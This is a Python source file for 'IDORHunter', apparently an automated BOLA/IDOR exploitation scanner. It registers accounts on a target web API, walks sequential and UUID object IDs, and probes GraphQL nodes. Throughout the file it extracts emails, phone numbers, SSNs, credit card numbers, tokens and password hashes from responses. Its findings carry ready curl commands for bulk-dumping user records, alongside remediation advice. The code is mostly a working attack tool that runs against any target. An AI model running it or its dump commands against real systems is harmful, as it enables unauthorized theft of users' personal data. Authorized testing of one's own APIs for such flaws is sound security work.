#!/usr/bin/env python3
import asyncio, aiohttp, json, re, sys, random, string, time
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY,
)

PII_PATTERNS = [
    (r'"email"\s*:\s*"([^"@]{2,}@[^"]{2,})"',          "email"),
    (r'"phone(?:_number)?"\s*:\s*"([+\d\- ]{7,})"',     "phone"),
    (r'"(?:full_?name|name)"\s*:\s*"([A-Za-z ]{4,})"',  "full_name"),
    (r'"address(?:_1)?"\s*:\s*"([^"]{5,})"',            "address"),
    (r'"(?:ssn|social_security)"\s*:\s*"([^"]{5,})"',   "ssn"),
    (r'"(?:dob|date_of_birth)"\s*:\s*"([^"]{5,})"',     "dob"),
    (r'"credit_card(?:_number)?"\s*:\s*"([^"]{8,})"',   "credit_card"),
    (r'"(?:balance|account_balance)"\s*:\s*([0-9.]+)',   "balance"),
    (r'"(?:token|api_key|secret)"\s*:\s*"([^"]{16,})"', "secret"),
    (r'"password_?(?:hash)?"\s*:\s*"([^"]{16,})"',      "password_hash"),
]

PII_PLACEHOLDER_VALUES = {
    "john doe", "jane doe", "test user", "example user", "john smith",
    "jane smith", "test", "example", "user", "admin", "demo", "sample",
    "foo", "bar", "baz", "alice", "bob", "charlie", "null", "undefined",
    "n/a", "na", "none", "placeholder", "lorem ipsum",
}

LOGIN_PATHS    = ["/api/auth/login",    "/api/login",    "/api/v1/auth/login",    "/api/v1/login",    "/auth/login", "/login"]
REGISTER_PATHS = ["/api/auth/register", "/api/register", "/api/v1/auth/register", "/api/v1/register", "/api/signup", "/api/users"]

OBJECT_PATHS = [
    ("/api/users/{id}",         "user profile"),
    ("/api/v1/users/{id}",      "user profile"),
    ("/api/profile/{id}",       "profile"),
    ("/api/orders/{id}",        "order"),
    ("/api/v1/orders/{id}",     "order"),
    ("/api/invoices/{id}",      "invoice"),
    ("/api/payments/{id}",      "payment"),
    ("/api/messages/{id}",      "message"),
    ("/api/documents/{id}",     "document"),
    ("/api/files/{id}",         "file"),
    ("/api/accounts/{id}",      "account"),
    ("/api/transactions/{id}",  "transaction"),
    ("/api/subscriptions/{id}", "subscription"),
    ("/api/addresses/{id}",     "address"),
    ("/api/admin/users/{id}",   "admin user view"),
    ("/api/v1/admin/users/{id}","admin user view"),
]

ID_ENDPOINTS = [
    "/api/users", "/api/v1/users", "/api/admin/users",
    "/api/accounts", "/api/orders", "/api/customers",
]


def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _is_placeholder_pii(value: str) -> bool:
    v = value.strip().lower()
    if v in PII_PLACEHOLDER_VALUES:
        return True
    if re.match(r'^[a-z]+\d+@(example|test|demo|mail|foo|bar)\.', v):
        return True
    if re.match(r'^test[-_]?user', v) or re.match(r'^mirror[-_]?', v):
        return True
    return False


def _extract_pii(body: str) -> dict:
    found = {}
    for pattern, label in PII_PATTERNS:
        m = re.search(pattern, body, re.IGNORECASE)
        if m:
            val = m.group(1).strip()
            if not _is_placeholder_pii(val):
                found[label] = val
    return found


def _extract_pii_strict(body: str) -> dict:
    """Return PII found in body.  Previously required ≥2 fields which caused
    false-negatives on endpoints that only leak a single field (e.g. email).
    Lowered to ≥1 so single-field leaks are still surfaced as findings."""
    all_pii = _extract_pii(body)
    if len(all_pii) < 1:
        return {}
    return all_pii


def _body_diff_ratio(a: str, b: str) -> float:
    if not a or not b:
        return 0.0
    set_a = set(re.findall(r'"[^"]{3,}"', a))
    set_b = set(re.findall(r'"[^"]{3,}"', b))
    if not set_a or not set_b:
        return 0.0
    intersection = len(set_a & set_b)
    union = len(set_a | set_b)
    return intersection / union if union else 0.0


def _extract_id(body: str, field_names=None) -> str | None:
    fields = field_names or ["id", "user_id", "userId", "uid", "_id", "account_id"]
    for f in fields:
        m = re.search(rf'"{f}"\s*:\s*"?([A-Za-z0-9\-_]{{1,36}})"?', body)
        if m:
            v = m.group(1)
            if re.match(r"^[0-9]+$", v) or re.match(r"^[0-9a-f\-]{8,}$", v, re.I):
                return v
    return None


def _extract_uuids(body: str) -> list:
    pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
    return list(set(re.findall(pattern, body, re.IGNORECASE)))


def _extract_token(body: str) -> str | None:
    for pattern in [
        r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]{20,})"',
        r"Bearer\s+([A-Za-z0-9\-_\.]{20,})",
        r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,})",
    ]:
        m = re.search(pattern, body)
        if m:
            return m.group(1)
    return None


class IDORHunter:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 proof_type="UNAUTHORIZED_ACCESS", extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     True,
            "mitigation_layers": [
                "Object-level authorization check on every request",
                "Ownership validation before data return",
                "Resource scoping to authenticated user's session",
                "Opaque/random IDs instead of sequential integers",
            ],
            "mitre_technique":   "T1078",
            "mitre_name":        "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None, json_data=None, timeout=12):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data,
                ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    async def _post(self, sess, path, json_data=None, headers=None):
        return await self._request(sess, "POST", self.target + path,
                                   headers=headers, json_data=json_data)

    async def _get(self, sess, path_or_url, headers=None, timeout=10):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    async def _login(self, sess, path, username, password):
        for u_field in ["username", "email", "login"]:
            s, body, hdrs = await self._post(
                sess, path,
                json_data={u_field: username, "password": password},
            )
            await delay()
            if s in (200, 201) and len(body) > 30:
                token = _extract_token(body)
                uid   = _extract_id(body)
                if token or uid:
                    return token, uid, body
        return None, None, ""

    async def _register_and_login(self, sess):
        suffix = _rand_str(7)
        users = []
        for i in range(1, 3):
            uname = f"mirror_u{i}_{suffix}"
            email = f"{uname}@protonmail.com"
            passw = f"MirrorTest@{suffix}{i}!X"
            for reg_path in REGISTER_PATHS:
                s, body, _ = await self._post(sess, reg_path, json_data={
                    "username": uname, "email": email, "password": passw,
                    "name": f"MirrorTest{i}", "confirm_password": passw,
                })
                await delay()
                if s in (200, 201) and len(body) > 10:
                    uid = _extract_id(body)
                    uuids = _extract_uuids(body)
                    for login_path in LOGIN_PATHS:
                        token, uid2, body2 = await self._login(sess, login_path, email, passw)
                        if token:
                            uid = uid or uid2
                            if not uid and uuids:
                                uid = uuids[0]
                            users.append({
                                "username": uname, "email": email, "password": passw,
                                "token": token, "uid": uid,
                                "uuids": uuids, "login_path": login_path,
                                "reg_body": body,
                            })
                            print(f"  [*] Registered user{i}: uid={uid} token={token[:30]}...")
                            break
                    break
                if s == 409:
                    break
        return users

    async def test_two_account_idor(self, sess):
        print("\n[*] Registering two accounts to test cross-account IDOR...")
        users = await self._register_and_login(sess)
        if len(users) < 2:
            print("  [SKIP] Could not register two accounts")
            return

        user_a, user_b = users[0], users[1]
        auth_a = {"Authorization": f"Bearer {user_a['token']}"}
        auth_b = {"Authorization": f"Bearer {user_b['token']}"}

        for path_tpl, resource_name in OBJECT_PATHS:
            if "{id}" not in path_tpl or user_b["uid"] is None:
                continue

            path_b = path_tpl.replace("{id}", user_b["uid"])

            s_owner, body_owner, _ = await self._get(sess, path_b, headers=auth_b)
            await delay()
            if s_owner not in (200, 201) or not body_owner or len(body_owner) < 30:
                continue

            s_unauth, body_unauth, _ = await self._get(sess, path_b)
            await delay()

            s_idor, body_idor, _ = await self._get(sess, path_b, headers=auth_a)
            await delay()

            if s_idor != 200 or not body_idor or len(body_idor) < 30:
                continue

            diff_vs_owner  = _body_diff_ratio(body_owner, body_idor)
            diff_vs_unauth = _body_diff_ratio(body_unauth, body_idor)

            owner_email_present    = user_b["email"] in body_idor
            owner_username_present = user_b["username"] in body_idor
            owner_uid_present      = (user_b["uid"] or "") in body_idor

            pii = _extract_pii_strict(body_idor)

            real_data_confirmed = (
                owner_email_present or
                owner_username_present or
                owner_uid_present or
                len(pii) >= 2
            )

            same_as_unauth = diff_vs_unauth > 0.9 and s_unauth == 200
            if same_as_unauth:
                continue

            cross_access_confirmed = real_data_confirmed and diff_vs_owner > 0.5

            if cross_access_confirmed:
                proof = (
                    f"User A (uid={user_a['uid']}) accessing User B resource:\n"
                    f"  Resource path: {path_b}  (owner=User B uid={user_b['uid']})\n"
                    f"  Authorization: Bearer <User A token>\n"
                    f"  HTTP {s_idor} — UNAUTHORIZED DATA RETURNED\n"
                    f"  Owner response similarity to attacker response: {diff_vs_owner:.0%}\n"
                    f"  User B email in response: {'YES' if owner_email_present else 'NO'}\n"
                    f"  PII fields extracted: {list(pii.keys()) if pii else 'N/A'}\n"
                    f"  Body preview: {body_idor[:500]}"
                )
                self._finding(
                    ftype="IDOR_CROSS_ACCOUNT_DATA_ACCESS",
                    severity="CRITICAL",
                    conf=97,
                    proof=proof,
                    detail=(
                        f"IDOR confirmed on {resource_name} endpoint {path_b}. "
                        f"User A (uid={user_a['uid']}) reads User B's (uid={user_b['uid']}) "
                        f"private data by changing the ID. Response similarity to owner: {diff_vs_owner:.0%}."
                    ),
                    url=self.target + path_b,
                    remediation=(
                        "1. Check ownership before returning data: WHERE user_id = session.user_id AND id = requested_id.\n"
                        "2. Scope all data queries to the authenticated user's session.\n"
                        "3. Use UUIDs instead of sequential IDs to reduce guessability.\n"
                        "4. Add authorization unit tests for every object-level endpoint."
                    ),
                    exploitability=9,
                    impact=f"Unauthorized access to {resource_name} of any user — attacker iterates IDs to exfiltrate all user data. PII: {', '.join(pii.keys()) if pii else 'user identifiers'}.",
                    reproducibility=(
                        f"curl -s -X POST {self.target}{user_a['login_path']} "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"email\":\"{user_a['email']}\",\"password\":\"{user_a['password']}\"}}'\n"
                        f"curl -s {self.target}{path_b} -H 'Authorization: Bearer <token_a>'"
                    ),
                    proof_type="UNAUTHORIZED_ACCESS",
                    extra={"victim_uid": user_b["uid"], "attacker_uid": user_a["uid"],
                           "pii_extracted": pii, "similarity_score": round(diff_vs_owner, 3)},
                )
                return

    async def test_sequential_id_walk(self, sess):
        print("\n[*] Testing sequential ID walking (unauthenticated)...")
        for base_path in ["/api/users", "/api/v1/users", "/api/accounts",
                          "/api/orders", "/api/customers", "/api/admin/users"]:
            for uid in range(1, 8):
                path = f"{base_path}/{uid}"
                s, body, _ = await self._get(sess, path)
                await delay(0.12)
                if s == 200 and len(body) > 50:
                    pii = _extract_pii_strict(body)
                    if len(pii) >= 2:
                        proof = (
                            f"GET {path}  (unauthenticated, no token)\n"
                            f"  HTTP {s} — user data returned\n"
                            f"  PII fields found: {', '.join(pii.keys())}\n"
                            f"  PII values: {json.dumps({k: v[:20] for k, v in pii.items()})}\n"
                            f"  Body: {body[:500]}"
                        )
                        self._finding(
                            ftype="IDOR_UNAUTHENTICATED_USER_ENUMERATION",
                            severity="CRITICAL",
                            conf=95,
                            proof=proof,
                            detail=f"User data at {path} accessible without authentication. Sequential ID iteration exposes all user records. {len(pii)} PII fields confirmed co-located.",
                            url=self.target + path,
                            remediation=(
                                "1. Require authentication for all user data endpoints.\n"
                                "2. Enforce object-level authorization: only return data belonging to the authenticated user.\n"
                                "3. Rate-limit enumeration: max 10 requests/minute on user data endpoints.\n"
                                "4. Replace integer IDs with unpredictable UUIDs."
                            ),
                            exploitability=10,
                            impact=f"Full user database exfiltration — attacker scrapes all user records. PII confirmed: {', '.join(pii.keys())}.",
                            reproducibility=f"for i in $(seq 1 100); do curl -s {self.target}{base_path}/$i | jq '.email,.username,.name'; done",
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"uid_tested": uid, "pii_extracted": pii},
                        )
                        return

    async def test_user_list_exposure(self, sess):
        print("\n[*] Testing user list exposure without auth...")
        for path in ID_ENDPOINTS:
            s, body, _ = await self._get(sess, path)
            await delay(0.12)
            if s == 200 and len(body) > 100:
                pii = _extract_pii(body)
                count_match = re.search(r'"(?:total|count|total_count)"\s*:\s*(\d+)', body)
                count = int(count_match.group(1)) if count_match else 0
                list_match = re.search(r'\[\s*\{', body)
                real_pii = {k: v for k, v in pii.items() if not _is_placeholder_pii(v)}
                if list_match and (len(real_pii) >= 1 or '"email"' in body):
                    proof = (
                        f"GET {path}  (no Authorization header)\n"
                        f"  HTTP {s} — user list returned\n"
                        f"  Total records: {count or 'unknown'}\n"
                        f"  PII fields confirmed: {', '.join(real_pii.keys()) if real_pii else 'email/username in array'}\n"
                        f"  Body preview: {body[:600]}"
                    )
                    self._finding(
                        ftype="IDOR_USER_LIST_UNAUTHENTICATED",
                        severity="CRITICAL",
                        conf=95,
                        proof=proof,
                        detail=f"User list at {path} accessible without authentication. Returns all user records in a single request.",
                        url=self.target + path,
                        remediation=(
                            "1. Require Bearer token authentication on all list endpoints.\n"
                            "2. Admin-only lists must check the 'admin' role in the token.\n"
                            "3. Paginate results and log access.\n"
                            "4. Return only the authenticated user's own data unless explicitly admin-scoped."
                        ),
                        exploitability=10,
                        impact=f"Complete user database dump in one request. {count} records exposed.",
                        reproducibility=f"curl -s {self.target}{path} | jq '.[].email'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        extra={"total_records": count, "pii_extracted": real_pii},
                    )

    async def test_uuid_idor(self, sess):
        print("\n[*] Testing UUID-based IDOR...")
        users = await self._register_and_login(sess)
        if not users:
            return
        user_a = users[0]
        auth_a = {"Authorization": f"Bearer {user_a['token']}"}
        uuids_b = []
        if len(users) >= 2:
            uuids_b = users[1].get("uuids", [])
        if not uuids_b:
            uuids_b = _extract_uuids(user_a.get("reg_body", ""))

        for uuid_val in uuids_b[:5]:
            for path_tpl, resource_name in OBJECT_PATHS:
                if "{id}" not in path_tpl:
                    continue
                path = path_tpl.replace("{id}", uuid_val)
                s_anon, body_anon, _ = await self._get(sess, path)
                await delay(0.1)
                s_auth, body_auth, _ = await self._get(sess, path, headers=auth_a)
                await delay(0.1)
                if s_auth == 200 and len(body_auth) > 50:
                    pii = _extract_pii_strict(body_auth)
                    if s_anon != 200 and len(pii) >= 1:
                        proof = (
                            f"UUID-based IDOR: {uuid_val}\n"
                            f"  Unauthenticated: HTTP {s_anon}\n"
                            f"  Authenticated as User A: HTTP {s_auth}\n"
                            f"  Resource: {resource_name} at {path}\n"
                            f"  PII extracted: {json.dumps(pii)}\n"
                            f"  Body: {body_auth[:400]}"
                        )
                        self._finding(
                            ftype="IDOR_UUID_CROSS_ACCOUNT_ACCESS",
                            severity="HIGH",
                            conf=88,
                            proof=proof,
                            detail=f"UUID-based IDOR on {resource_name} — authenticated user can access resource UUID {uuid_val} belonging to another account.",
                            url=self.target + path,
                            remediation=(
                                "1. UUIDs are not authorization — always verify ownership server-side.\n"
                                "2. Filter queries by authenticated user: WHERE owner_id = session.user_id AND uuid = requested_uuid.\n"
                                "3. Return 403 (not 404) when a UUID exists but is not owned by the requester.\n"
                                "4. Log access to any UUID-identified resource."
                            ),
                            exploitability=7,
                            impact=f"Attacker with any valid token can access {resource_name} data belonging to other users by knowing or guessing their UUIDs. PII: {', '.join(pii.keys())}.",
                            reproducibility=(
                                f"curl -s {self.target}{path} -H 'Authorization: Bearer <any_valid_token>'"
                            ),
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"uuid": uuid_val, "pii_extracted": pii, "resource": resource_name},
                        )
                        return

    async def test_graphql_idor(self, sess):
        print("\n[*] Testing GraphQL node ID enumeration...")
        users = await self._register_and_login(sess)
        if not users:
            return
        user_a = users[0]
        auth_a = {"Authorization": f"Bearer {user_a['token']}", "Content-Type": "application/json"}

        for gql_path in ["/graphql", "/api/graphql", "/gql", "/api/gql", "/query"]:
            introspect = {"query": "{ __schema { types { name } } }"}
            s, body, _ = await self._request(sess, "POST", self.target + gql_path,
                                              headers=auth_a, json_data=introspect)
            await delay(0.2)
            if s not in (200, 201) or '"__schema"' not in (body or ""):
                continue

            for test_id in range(1, 6):
                for node_query in [
                    f'{{ node(id: "{test_id}") {{ id ... on User {{ email name }} }} }}',
                    f'{{ user(id: {test_id}) {{ id email name phone }} }}',
                    f'{{ users {{ nodes {{ id email name }} }} }}',
                ]:
                    s2, body2, _ = await self._request(
                        sess, "POST", self.target + gql_path,
                        headers=auth_a, json_data={"query": node_query},
                    )
                    await delay(0.15)
                    if s2 != 200 or not body2:
                        continue
                    pii = _extract_pii_strict(body2)
                    if len(pii) >= 1 and '"data"' in body2 and '"errors"' not in body2:
                        proof = (
                            f"POST {self.target}{gql_path}\n"
                            f"  Query: {node_query[:100]}\n"
                            f"  HTTP {s2}\n"
                            f"  PII in response: {json.dumps(pii)}\n"
                            f"  Body: {body2[:500]}"
                        )
                        self._finding(
                            ftype="GRAPHQL_IDOR_NODE_ENUMERATION",
                            severity="HIGH",
                            conf=87,
                            proof=proof,
                            detail=f"GraphQL endpoint {gql_path} returns other users' data via node ID enumeration. Introspection enabled — schema exposed.",
                            url=self.target + gql_path,
                            remediation=(
                                "1. Implement field-level authorization in all GraphQL resolvers.\n"
                                "2. Disable introspection in production.\n"
                                "3. Use persisted queries only — reject arbitrary GraphQL strings.\n"
                                "4. Verify ownership inside every resolver before returning data."
                            ),
                            exploitability=8,
                            impact=f"GraphQL node enumeration exposes user PII across all object types. PII confirmed: {', '.join(pii.keys())}.",
                            reproducibility=(
                                f"curl -s -X POST {self.target}{gql_path} "
                                f"-H 'Authorization: Bearer <token>' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"query\":\"{node_query}\"}}'",
                            ),
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"graphql_path": gql_path, "pii_extracted": pii},
                        )
                        return

    async def test_object_idor_with_auth(self, sess):
        print("\n[*] Testing object IDOR with authentication (horizontal escalation)...")
        users = await self._register_and_login(sess)
        if not users:
            return
        user_a = users[0]
        auth_a = {"Authorization": f"Bearer {user_a['token']}"}
        for path_tpl, resource_name in OBJECT_PATHS:
            for test_id in ["1", "2", "3", "100", "999"]:
                if "{id}" in path_tpl:
                    path = path_tpl.replace("{id}", test_id)
                else:
                    path = path_tpl
                if user_a.get("uid") == test_id:
                    continue
                s, body, _ = await self._get(sess, path, headers=auth_a)
                await delay(0.1)
                if s == 200 and len(body) > 80:
                    pii = _extract_pii_strict(body)
                    if len(pii) >= 2:
                        proof = (
                            f"User A (uid={user_a['uid']}) accessing {resource_name} id={test_id}:\n"
                            f"  GET {path}\n"
                            f"  Authorization: Bearer <User A token>\n"
                            f"  HTTP {s} — another user data returned\n"
                            f"  PII extracted ({len(pii)} fields): {json.dumps(pii)}\n"
                            f"  Body preview: {body[:400]}"
                        )
                        self._finding(
                            ftype=f"IDOR_AUTHENTICATED_{resource_name.upper().replace(' ', '_')}",
                            severity="HIGH",
                            conf=90,
                            proof=proof,
                            detail=f"Authenticated user can access {resource_name} (id={test_id}) belonging to another account. No ownership check at {path}. {len(pii)} PII fields co-located.",
                            url=self.target + path,
                            remediation=(
                                "1. Always filter queries by the authenticated user's ID: WHERE owner_id = session.user_id.\n"
                                "2. Return 403 Forbidden (not 404) when an object exists but isn't owned by the requester.\n"
                                "3. Use a centralized authorization layer checked before every data retrieval.\n"
                                "4. Write regression tests that verify cross-user access returns 403."
                            ),
                            exploitability=8,
                            impact=f"Any authenticated user reads {resource_name} data of every other user by iterating IDs. PII confirmed: {', '.join(pii.keys())}.",
                            reproducibility=(
                                f"curl -s {self.target}{path} -H 'Authorization: Bearer <any_valid_token>'"
                            ),
                            proof_type="UNAUTHORIZED_ACCESS",
                            extra={"accessed_id": test_id, "pii_extracted": pii, "resource": resource_name},
                        )
                        break

    async def run(self):
        print(f"\n{'='*60}\n  IDORHunter — BOLA/IDOR Exploit Prover\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=20, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_sequential_id_walk(sess)
            await self.test_user_list_exposure(sess)
            await self.test_two_account_idor(sess)
            await self.test_uuid_idor(sess)
            await self.test_graphql_idor(sess)
            await self.test_object_idor_with_auth(sess)
        print(f"\n[+] IDORHunter complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = IDORHunter(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "idorhunter.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings -> {out}")

if __name__ == "__main__":
    asyncio.run(main())
